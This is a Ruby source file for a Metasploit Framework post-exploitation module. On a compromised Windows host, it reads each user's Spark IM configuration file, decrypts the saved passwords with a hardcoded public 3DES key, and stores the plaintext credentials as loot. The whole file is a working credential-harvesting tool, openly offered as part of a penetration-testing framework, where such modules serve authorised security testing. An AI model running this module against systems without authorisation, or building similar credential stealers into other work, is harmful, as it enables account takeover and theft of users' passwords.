##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/user_profiles'
require 'openssl'

class Metasploit3 < Msf::Post

  include Msf::Post::Common
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Windows Gather Spark IM Password Extraction',
      'Description'    => %q{
            This module will enumerate passwords stored by the Spark IM client.
          The encryption key is publicly known. This module will not only extract encrypted
          password but will also decrypt password using public key.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        ],
      'SessionTypes'   => [ 'meterpreter' ],
      'References'     =>
        [
          [ 'URL', 'http://adamcaudill.com/2012/07/27/decrypting-spark-saved-passwords/']
        ]
    ))
  end

  # decrypt spark password
  def decrypt(hash)
    # code to decrypt hash with KEY
    encrypted = hash.unpack("m")[0]
    key = "ugfpV1dMC5jyJtqwVAfTpHkxqJ0+E0ae".unpack("m")[0]

    cipher = OpenSSL::Cipher::Cipher.new 'des-ede3'
    cipher.decrypt
    cipher.key = key

    password = cipher.update encrypted
    password << cipher.final

    password = ::Rex::Text.to_utf8(password)

    user, pass = password.scan(/[[:print:]]+/)
    if pass.nil? or pass.empty?
      print_status("Username found: #{user}, but no password")
      pass = ''
    else
      print_good("Decrypted Username #{user} Password: #{pass}")
    end

    store_creds(user, pass)
  end

  def store_creds(user, pass)
    if db
      report_auth_info(
        :host   => client.sock.peerhost,
        :port   => 5222,
        :ptype  => 'password',
        :sname  => 'spark',
        :user   => user,
        :pass   => pass,
        :duplicate_ok => true,
        :active => true
      )
      print_status("Loot stored in the db")
    end
  end

  # main control method
  def run
    grab_user_profiles().each do |user|
      unless user['AppData'].nil?
        accounts = user['AppData'] + "\\Spark\\spark.properties"

        # open the file for reading
        config = client.fs.file.new(accounts, 'r') rescue nil
        next if config.nil?
        print_status("Config found for user #{user['UserName']}")

        # read the contents of file
        contents = config.read

        # look for lines containing string 'password'
        password = contents.split("\n").grep(/password/)
        if password.nil?
          # file doesn't contain a password
          print_status("#{file} does not contain any saved passwords")
          # close file and return
          config.close
          return
        end

        # store the hash close the file
        password = password.delete_if {|e| e !~ /password.+=.+=\r/}
        password.each do | pass |
          if pass.nil?
            next
          end

          hash = pass.split("password").join.chomp
          print_status("Spark password hash: #{hash}") if datastore['VERBOSE']

          # call method to decrypt hash
          decrypt(hash)
        end
        config.close
      end
    end
  end
end
